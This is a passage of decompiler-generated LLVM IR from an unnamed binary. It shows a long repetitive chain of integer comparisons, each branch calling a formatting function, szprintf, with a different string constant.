  %v2_b0a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0b4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b0c0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b0cc = sext i8 %v3_b0b4 to i32
  %v6_b0cc = sext i8 %v3_b0c0 to i32
  %v8_b0cc = call i32 @szprintf(i32 %v2_b0a8, i32 ptrtoint ([12 x i8]* @global_var_23c94.150 to i32), i32 %v4_b0cc, i32 %v6_b0cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0d0

dec_label_pc_b0d0:                                ; preds = %dec_label_pc_b09c, %dec_label_pc_b0a8
  %v7_b0d4 = icmp eq i32 %v2_a95c, 36
  br i1 %v7_b0d4, label %dec_label_pc_b0dc, label %dec_label_pc_b104

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0d0
  %v2_b0dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0e8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b0f4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b100 = sext i8 %v3_b0e8 to i32
  %v6_b100 = sext i8 %v3_b0f4 to i32
  %v8_b100 = call i32 @szprintf(i32 %v2_b0dc, i32 ptrtoint ([12 x i8]* @global_var_23ca0.152 to i32), i32 %v4_b100, i32 %v6_b100, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b104

dec_label_pc_b104:                                ; preds = %dec_label_pc_b0d0, %dec_label_pc_b0dc
  %v7_b108 = icmp eq i32 %v2_a95c, 37
  br i1 %v7_b108, label %dec_label_pc_b110, label %dec_label_pc_b138

dec_label_pc_b110:                                ; preds = %dec_label_pc_b104
  %v2_b110 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b11c = load i8, i8* @global_var_324e1.75, align 1
  %v3_b128 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b134 = sext i8 %v3_b11c to i32
  %v6_b134 = sext i8 %v3_b128 to i32
  %v8_b134 = call i32 @szprintf(i32 %v2_b110, i32 ptrtoint ([12 x i8]* @global_var_23cac.154 to i32), i32 %v4_b134, i32 %v6_b134, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b138

dec_label_pc_b138:                                ; preds = %dec_label_pc_b104, %dec_label_pc_b110
  %v7_b13c = icmp eq i32 %v2_a95c, 38
  br i1 %v7_b13c, label %dec_label_pc_b144, label %dec_label_pc_b16c

dec_label_pc_b144:                                ; preds = %dec_label_pc_b138
  %v2_b144 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b150 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b15c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b168 = sext i8 %v3_b150 to i32
  %v6_b168 = sext i8 %v3_b15c to i32
  %v8_b168 = call i32 @szprintf(i32 %v2_b144, i32 ptrtoint ([13 x i8]* @global_var_23cb8.156 to i32), i32 %v4_b168, i32 %v6_b168, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b16c

dec_label_pc_b16c:                                ; preds = %dec_label_pc_b138, %dec_label_pc_b144
  %v7_b170 = icmp eq i32 %v2_a95c, 39
  br i1 %v7_b170, label %dec_label_pc_b178, label %dec_label_pc_b1a0

dec_label_pc_b178:                                ; preds = %dec_label_pc_b16c
  %v2_b178 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b184 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b190 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b19c = sext i8 %v3_b184 to i32
  %v6_b19c = sext i8 %v3_b190 to i32
  %v8_b19c = call i32 @szprintf(i32 %v2_b178, i32 ptrtoint ([13 x i8]* @global_var_23cc8.158 to i32), i32 %v4_b19c, i32 %v6_b19c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1a0

dec_label_pc_b1a0:                                ; preds = %dec_label_pc_b16c, %dec_label_pc_b178
  %v7_b1a4 = icmp eq i32 %v2_a95c, 40
  br i1 %v7_b1a4, label %dec_label_pc_b1ac, label %dec_label_pc_b1d4

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b1a0
  %v2_b1ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1b8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b1c4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b1d0 = sext i8 %v3_b1b8 to i32
  %v6_b1d0 = sext i8 %v3_b1c4 to i32
  %v8_b1d0 = call i32 @szprintf(i32 %v2_b1ac, i32 ptrtoint ([13 x i8]* @global_var_23cb8.156 to i32), i32 %v4_b1d0, i32 %v6_b1d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1d4

dec_label_pc_b1d4:                                ; preds = %dec_label_pc_b1a0, %dec_label_pc_b1ac
  %v7_b1d8 = icmp eq i32 %v2_a95c, 41
  br i1 %v7_b1d8, label %dec_label_pc_b1e0, label %dec_label_pc_b208

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1d4
  %v2_b1e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1ec = load i8, i8* @global_var_324e1.75, align 1
  %v3_b1f8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b204 = sext i8 %v3_b1ec to i32
  %v6_b204 = sext i8 %v3_b1f8 to i32
  %v8_b204 = call i32 @szprintf(i32 %v2_b1e0, i32 ptrtoint ([13 x i8]* @global_var_23cd8.160 to i32), i32 %v4_b204, i32 %v6_b204, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b208

dec_label_pc_b208:                                ; preds = %dec_label_pc_b1d4, %dec_label_pc_b1e0
  %v7_b20c = icmp eq i32 %v2_a95c, 42
  br i1 %v7_b20c, label %dec_label_pc_b214, label %dec_label_pc_b23c

dec_label_pc_b214:                                ; preds = %dec_label_pc_b208
  %v2_b214 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b220 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b22c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b238 = sext i8 %v3_b220 to i32
  %v6_b238 = sext i8 %v3_b22c to i32
  %v8_b238 = call i32 @szprintf(i32 %v2_b214, i32 ptrtoint ([13 x i8]* @global_var_23ce8.162 to i32), i32 %v4_b238, i32 %v6_b238, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b23c

dec_label_pc_b23c:                                ; preds = %dec_label_pc_b208, %dec_label_pc_b214
  %v7_b240 = icmp eq i32 %v2_a95c, 43
  br i1 %v7_b240, label %dec_label_pc_b248, label %dec_label_pc_b270

dec_label_pc_b248:                                ; preds = %dec_label_pc_b23c
  %v2_b248 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b254 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b260 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b26c = sext i8 %v3_b254 to i32
  %v6_b26c = sext i8 %v3_b260 to i32
  %v8_b26c = call i32 @szprintf(i32 %v2_b248, i32 ptrtoint ([13 x i8]* @global_var_23cf8.164 to i32), i32 %v4_b26c, i32 %v6_b26c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b270

dec_label_pc_b270:                                ; preds = %dec_label_pc_b23c, %dec_label_pc_b248
  %v7_b274 = icmp eq i32 %v2_a95c, 44
  br i1 %v7_b274, label %dec_label_pc_b27c, label %dec_label_pc_b2a4

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b270
  %v2_b27c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b288 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b294 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b2a0 = sext i8 %v3_b288 to i32
  %v6_b2a0 = sext i8 %v3_b294 to i32
  %v8_b2a0 = call i32 @szprintf(i32 %v2_b27c, i32 ptrtoint ([13 x i8]* @global_var_23ce8.162 to i32), i32 %v4_b2a0, i32 %v6_b2a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b27c
  %v7_b2a8 = icmp eq i32 %v2_a95c, 45
  br i1 %v7_b2a8, label %dec_label_pc_b2b0, label %dec_label_pc_b2d8

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b2a4
  %v2_b2b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2bc = load i8, i8* @global_var_324e1.75, align 1
  %v3_b2c8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b2d4 = sext i8 %v3_b2bc to i32
  %v6_b2d4 = sext i8 %v3_b2c8 to i32
  %v8_b2d4 = call i32 @szprintf(i32 %v2_b2b0, i32 ptrtoint ([13 x i8]* @global_var_23d08.166 to i32), i32 %v4_b2d4, i32 %v6_b2d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2d8

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2a4, %dec_label_pc_b2b0
  %v7_b2dc = icmp eq i32 %v2_a95c, 46
  br i1 %v7_b2dc, label %dec_label_pc_b2e4, label %dec_label_pc_b30c

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2d8
  %v2_b2e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2f0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b2fc = load i8, i8* @global_var_324e2.76, align 1
  %v4_b308 = sext i8 %v3_b2f0 to i32
  %v6_b308 = sext i8 %v3_b2fc to i32
  %v8_b308 = call i32 @szprintf(i32 %v2_b2e4, i32 ptrtoint ([13 x i8]* @global_var_23d18.168 to i32), i32 %v4_b308, i32 %v6_b308, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b30c

dec_label_pc_b30c:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b2e4
  %v7_b310 = icmp eq i32 %v2_a95c, 47
  br i1 %v7_b310, label %dec_label_pc_b318, label %dec_label_pc_b340

dec_label_pc_b318:                                ; preds = %dec_label_pc_b30c
  %v2_b318 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b324 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b330 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b33c = sext i8 %v3_b324 to i32
  %v6_b33c = sext i8 %v3_b330 to i32
  %v8_b33c = call i32 @szprintf(i32 %v2_b318, i32 ptrtoint ([13 x i8]* @global_var_23d28.170 to i32), i32 %v4_b33c, i32 %v6_b33c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b340

dec_label_pc_b340:                                ; preds = %dec_label_pc_b30c, %dec_label_pc_b318
  %v7_b344 = icmp eq i32 %v2_a95c, 48
  br i1 %v7_b344, label %dec_label_pc_b34c, label %dec_label_pc_b374

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b340
  %v2_b34c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b358 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b364 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b370 = sext i8 %v3_b358 to i32
  %v6_b370 = sext i8 %v3_b364 to i32
  %v8_b370 = call i32 @szprintf(i32 %v2_b34c, i32 ptrtoint ([13 x i8]* @global_var_23d38.172 to i32), i32 %v4_b370, i32 %v6_b370, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b374

dec_label_pc_b374:                                ; preds = %dec_label_pc_b340, %dec_label_pc_b34c
  %v7_b378 = icmp eq i32 %v2_a95c, 49
  br i1 %v7_b378, label %dec_label_pc_b380, label %dec_label_pc_b3a8

dec_label_pc_b380:                                ; preds = %dec_label_pc_b374
  %v2_b380 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b38c = load i8, i8* @global_var_324e1.75, align 1
  %v3_b398 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b3a4 = sext i8 %v3_b38c to i32
  %v6_b3a4 = sext i8 %v3_b398 to i32
  %v8_b3a4 = call i32 @szprintf(i32 %v2_b380, i32 ptrtoint ([13 x i8]* @global_var_23d48.174 to i32), i32 %v4_b3a4, i32 %v6_b3a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3a8

dec_label_pc_b3a8:                                ; preds = %dec_label_pc_b374, %dec_label_pc_b380
  %v7_b3ac = icmp eq i32 %v2_a95c, 50
  br i1 %v7_b3ac, label %dec_label_pc_b3b4, label %dec_label_pc_b3dc

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b3a8
  %v2_b3b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3c0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b3cc = load i8, i8* @global_var_324e2.76, align 1
  %v4_b3d8 = sext i8 %v3_b3c0 to i32
  %v6_b3d8 = sext i8 %v3_b3cc to i32
  %v8_b3d8 = call i32 @szprintf(i32 %v2_b3b4, i32 ptrtoint ([13 x i8]* @global_var_23d58.176 to i32), i32 %v4_b3d8, i32 %v6_b3d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3dc

dec_label_pc_b3dc:                                ; preds = %dec_label_pc_b3a8, %dec_label_pc_b3b4
  %v7_b3e0 = icmp eq i32 %v2_a95c, 51
  br i1 %v7_b3e0, label %dec_label_pc_b3e8, label %dec_label_pc_b410

dec_label_pc_b3e8:                                ; preds = %dec_label_pc_b3dc
  %v2_b3e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3f4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b400 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b40c = sext i8 %v3_b3f4 to i32
  %v6_b40c = sext i8 %v3_b400 to i32
  %v8_b40c = call i32 @szprintf(i32 %v2_b3e8, i32 ptrtoint ([14 x i8]* @global_var_23d68.178 to i32), i32 %v4_b40c, i32 %v6_b40c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b410

dec_label_pc_b410:                                ; preds = %dec_label_pc_b3dc, %dec_label_pc_b3e8
  %v7_b414 = icmp eq i32 %v2_a95c, 52
  br i1 %v7_b414, label %dec_label_pc_b41c, label %dec_label_pc_b444

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b410
  %v2_b41c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b428 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b434 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b440 = sext i8 %v3_b428 to i32
  %v6_b440 = sext i8 %v3_b434 to i32
  %v8_b440 = call i32 @szprintf(i32 %v2_b41c, i32 ptrtoint ([13 x i8]* @global_var_23d78.180 to i32), i32 %v4_b440, i32 %v6_b440, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b410, %dec_label_pc_b41c
  %v7_b448 = icmp eq i32 %v2_a95c, 53
  br i1 %v7_b448, label %dec_label_pc_b450, label %dec_label_pc_b478

dec_label_pc_b450:                                ; preds = %dec_label_pc_b444
  %v2_b450 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b45c = load i8, i8* @global_var_324e1.75, align 1
  %v3_b468 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b474 = sext i8 %v3_b45c to i32
  %v6_b474 = sext i8 %v3_b468 to i32
  %v8_b474 = call i32 @szprintf(i32 %v2_b450, i32 ptrtoint ([14 x i8]* @global_var_23d88.182 to i32), i32 %v4_b474, i32 %v6_b474, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b478

dec_label_pc_b478:                                ; preds = %dec_label_pc_b444, %dec_label_pc_b450
  %v7_b47c = icmp eq i32 %v2_a95c, 54
  br i1 %v7_b47c, label %dec_label_pc_b484, label %dec_label_pc_b4ac

dec_label_pc_b484:                                ; preds = %dec_label_pc_b478
  %v2_b484 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b490 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b49c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b4a8 = sext i8 %v3_b490 to i32
  %v6_b4a8 = sext i8 %v3_b49c to i32
  %v8_b4a8 = call i32 @szprintf(i32 %v2_b484, i32 ptrtoint ([13 x i8]* @global_var_23d98.184 to i32), i32 %v4_b4a8, i32 %v6_b4a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4ac

dec_label_pc_b4ac:                                ; preds = %dec_label_pc_b478, %dec_label_pc_b484
  %v7_b4b0 = icmp eq i32 %v2_a95c, 55
  br i1 %v7_b4b0, label %dec_label_pc_b4b8, label %dec_label_pc_b4e0

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b4ac
  %v2_b4b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4c4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b4d0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b4dc = sext i8 %v3_b4c4 to i32
  %v6_b4dc = sext i8 %v3_b4d0 to i32
  %v8_b4dc = call i32 @szprintf(i32 %v2_b4b8, i32 ptrtoint ([14 x i8]* @global_var_23da8.186 to i32), i32 %v4_b4dc, i32 %v6_b4dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4e0

dec_label_pc_b4e0:                                ; preds = %dec_label_pc_b4ac, %dec_label_pc_b4b8
  %v7_b4e4 = icmp eq i32 %v2_a95c, 56
  br i1 %v7_b4e4, label %dec_label_pc_b4ec, label %dec_label_pc_b514

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4e0
  %v2_b4ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4f8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b504 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b510 = sext i8 %v3_b4f8 to i32
  %v6_b510 = sext i8 %v3_b504 to i32
  %v8_b510 = call i32 @szprintf(i32 %v2_b4ec, i32 ptrtoint ([14 x i8]* @global_var_23db8.188 to i32), i32 %v4_b510, i32 %v6_b510, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %dec_label_pc_b4e0, %dec_label_pc_b4ec
  %v7_b518 = icmp eq i32 %v2_a95c, 57
  br i1 %v7_b518, label %dec_label_pc_b520, label %dec_label_pc_b548

dec_label_pc_b520:                                ; preds = %dec_label_pc_b514
  %v2_b520 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b52c = load i8, i8* @global_var_324e1.75, align 1
  %v3_b538 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b544 = sext i8 %v3_b52c to i32
  %v6_b544 = sext i8 %v3_b538 to i32
  %v8_b544 = call i32 @szprintf(i32 %v2_b520, i32 ptrtoint ([13 x i8]* @global_var_23dc8.190 to i32), i32 %v4_b544, i32 %v6_b544, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b548

dec_label_pc_b548:                                ; preds = %dec_label_pc_b514, %dec_label_pc_b520
  %v7_b54c = icmp eq i32 %v2_a95c, 58
  br i1 %v7_b54c, label %dec_label_pc_b554, label %dec_label_pc_b57c

dec_label_pc_b554:                                ; preds = %dec_label_pc_b548
  %v2_b554 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b560 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b56c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b578 = sext i8 %v3_b560 to i32
  %v6_b578 = sext i8 %v3_b56c to i32
  %v8_b578 = call i32 @szprintf(i32 %v2_b554, i32 ptrtoint ([13 x i8]* @global_var_23dd8.192 to i32), i32 %v4_b578, i32 %v6_b578, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b57c

dec_label_pc_b57c:                                ; preds = %dec_label_pc_b548, %dec_label_pc_b554
  %v7_b580 = icmp eq i32 %v2_a95c, 59
  br i1 %v7_b580, label %dec_label_pc_b588, label %dec_label_pc_b5b0

dec_label_pc_b588:                                ; preds = %dec_label_pc_b57c
  %v2_b588 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b594 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b5a0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b5ac = sext i8 %v3_b594 to i32
  %v6_b5ac = sext i8 %v3_b5a0 to i32
  %v8_b5ac = call i32 @szprintf(i32 %v2_b588, i32 ptrtoint ([13 x i8]* @global_var_23de8.194 to i32), i32 %v4_b5ac, i32 %v6_b5ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5b0

dec_label_pc_b5b0:                                ; preds = %dec_label_pc_b57c, %dec_label_pc_b588
  %v7_b5b4 = icmp eq i32 %v2_a95c, 60
  br i1 %v7_b5b4, label %dec_label_pc_b5bc, label %dec_label_pc_b5e4

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b5b0
  %v2_b5bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5c8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b5d4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b5e0 = sext i8 %v3_b5c8 to i32
  %v6_b5e0 = sext i8 %v3_b5d4 to i32
  %v8_b5e0 = call i32 @szprintf(i32 %v2_b5bc, i32 ptrtoint ([13 x i8]* @global_var_23df8.196 to i32), i32 %v4_b5e0, i32 %v6_b5e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b5b0, %dec_label_pc_b5bc
  %v7_b5e8 = icmp eq i32 %v2_a95c, 61
  br i1 %v7_b5e8, label %dec_label_pc_b5f0, label %dec_label_pc_b618

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5e4
  %v2_b5f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5fc = load i8, i8* @global_var_324e1.75, align 1
  %v3_b608 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b614 = sext i8 %v3_b5fc to i32
  %v6_b614 = sext i8 %v3_b608 to i32
  %v8_b614 = call i32 @szprintf(i32 %v2_b5f0, i32 ptrtoint ([13 x i8]* @global_var_23e08.198 to i32), i32 %v4_b614, i32 %v6_b614, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b618

dec_label_pc_b618:                                ; preds = %dec_label_pc_b5e4, %dec_label_pc_b5f0
  %v7_b61c = icmp eq i32 %v2_a95c, 62
  br i1 %v7_b61c, label %dec_label_pc_b624, label %dec_label_pc_b64c

dec_label_pc_b624:                                ; preds = %dec_label_pc_b618
  %v2_b624 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b630 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b63c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b648 = sext i8 %v3_b630 to i32
  %v6_b648 = sext i8 %v3_b63c to i32
  %v8_b648 = call i32 @szprintf(i32 %v2_b624, i32 ptrtoint ([13 x i8]* @global_var_23e18.200 to i32), i32 %v4_b648, i32 %v6_b648, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b64c

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b618, %dec_label_pc_b624
  %v7_b650 = icmp eq i32 %v2_a95c, 63
  br i1 %v7_b650, label %dec_label_pc_b658, label %dec_label_pc_b680

dec_label_pc_b658:                                ; preds = %dec_label_pc_b64c
  %v2_b658 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b664 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b670 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b67c = sext i8 %v3_b664 to i32
  %v6_b67c = sext i8 %v3_b670 to i32
  %v8_b67c = call i32 @szprintf(i32 %v2_b658, i32 ptrtoint ([13 x i8]* @global_var_23e28.202 to i32), i32 %v4_b67c, i32 %v6_b67c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b680

dec_label_pc_b680:                                ; preds = %dec_label_pc_b64c, %dec_label_pc_b658
  %v7_b684 = icmp eq i32 %v2_a95c, 64
  br i1 %v7_b684, label %dec_label_pc_b68c, label %dec_label_pc_b6b4

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b680
  %v2_b68c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b698 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b6a4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b6b0 = sext i8 %v3_b698 to i32
  %v6_b6b0 = sext i8 %v3_b6a4 to i32
  %v8_b6b0 = call i32 @szprintf(i32 %v2_b68c, i32 ptrtoint ([13 x i8]* @global_var_23e38.204 to i32), i32 %v4_b6b0, i32 %v6_b6b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6b4

dec_label_pc_b6b4:                                ; preds = %dec_label_pc_b680, %dec_label_pc_b68c
  %v7_b6b8 = icmp eq i32 %v2_a95c, 65
  br i1 %v7_b6b8, label %dec_label_pc_b6c0, label %dec_label_pc_b6e8

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b6b4
  %v2_b6c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6cc = load i8, i8* @global_var_324e1.75, align 1
  %v3_b6d8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b6e4 = sext i8 %v3_b6cc to i32
  %v6_b6e4 = sext i8 %v3_b6d8 to i32
  %v8_b6e4 = call i32 @szprintf(i32 %v2_b6c0, i32 ptrtoint ([13 x i8]* @global_var_23e48.206 to i32), i32 %v4_b6e4, i32 %v6_b6e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6e8

dec_label_pc_b6e8:                                ; preds = %dec_label_pc_b6b4, %dec_label_pc_b6c0
  %v7_b6ec = icmp eq i32 %v2_a95c, 66
  br i1 %v7_b6ec, label %dec_label_pc_b6f4, label %dec_label_pc_b71c

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6e8
  %v2_b6f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b700 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b70c = load i8, i8* @global_var_324e2.76, align 1
  %v4_b718 = sext i8 %v3_b700 to i32
  %v6_b718 = sext i8 %v3_b70c to i32
  %v8_b718 = call i32 @szprintf(i32 %v2_b6f4, i32 ptrtoint ([13 x i8]* @global_var_23e58.208 to i32), i32 %v4_b718, i32 %v6_b718, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b71c

dec_label_pc_b71c:                                ; preds = %dec_label_pc_b6e8, %dec_label_pc_b6f4
  %v7_b720 = icmp eq i32 %v2_a95c, 67
  br i1 %v7_b720, label %dec_label_pc_b728, label %dec_label_pc_b750

dec_label_pc_b728:                                ; preds = %dec_label_pc_b71c
  %v2_b728 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b734 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b740 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b74c = sext i8 %v3_b734 to i32
  %v6_b74c = sext i8 %v3_b740 to i32
  %v8_b74c = call i32 @szprintf(i32 %v2_b728, i32 ptrtoint ([13 x i8]* @global_var_23e68.210 to i32), i32 %v4_b74c, i32 %v6_b74c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b750

dec_label_pc_b750:                                ; preds = %dec_label_pc_b71c, %dec_label_pc_b728
  %v7_b754 = icmp eq i32 %v2_a95c, 68
  br i1 %v7_b754, label %dec_label_pc_b75c, label %dec_label_pc_b784

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b750
  %v2_b75c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b768 = load i8, i8* @global_var_324e1.75, align 1
  %v3_b774 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b780 = sext i8 %v3_b768 to i32
  %v6_b780 = sext i8 %v3_b774 to i32
  %v8_b780 = call i32 @szprintf(i32 %v2_b75c, i32 ptrtoint ([13 x i8]* @global_var_23e78.212 to i32), i32 %v4_b780, i32 %v6_b780, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b784

dec_label_pc_b784:                                ; preds = %dec_label_pc_b750, %dec_label_pc_b75c
  %v7_b788 = icmp eq i32 %v2_a95c, 69
  br i1 %v7_b788, label %dec_label_pc_b790, label %dec_label_pc_ba04

dec_label_pc_b790:                                ; preds = %dec_label_pc_b784
  %v2_b790 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b79c = load i8, i8* @global_var_324e1.75, align 1
  %v3_b7a8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_b7b4 = sext i8 %v3_b79c to i32
  %v6_b7b4 = sext i8 %v3_b7a8 to i32
  %v8_b7b4 = call i32 @szprintf(i32 %v2_b790, i32 ptrtoint ([13 x i8]* @global_var_23e88.214 to i32), i32 %v4_b7b4, i32 %v6_b7b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba04

dec_label_pc_ba04:                                ; preds = %dec_label_pc_b784, %dec_label_pc_b790
  %v7_ba08 = icmp eq i32 %v2_a95c, 70
  br i1 %v7_ba08, label %dec_label_pc_ba10, label %dec_label_pc_ba38

dec_label_pc_ba10:                                ; preds = %dec_label_pc_ba04
  %v2_ba10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba1c = load i8, i8* @global_var_324e1.75, align 1
  %v3_ba28 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ba34 = sext i8 %v3_ba1c to i32
  %v6_ba34 = sext i8 %v3_ba28 to i32
  %v8_ba34 = call i32 @szprintf(i32 %v2_ba10, i32 ptrtoint ([13 x i8]* @global_var_23e98.216 to i32), i32 %v4_ba34, i32 %v6_ba34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba38

dec_label_pc_ba38:                                ; preds = %dec_label_pc_ba04, %dec_label_pc_ba10
  %v7_ba3c = icmp eq i32 %v2_a95c, 71
  br i1 %v7_ba3c, label %dec_label_pc_ba44, label %dec_label_pc_ba6c

dec_label_pc_ba44:                                ; preds = %dec_label_pc_ba38
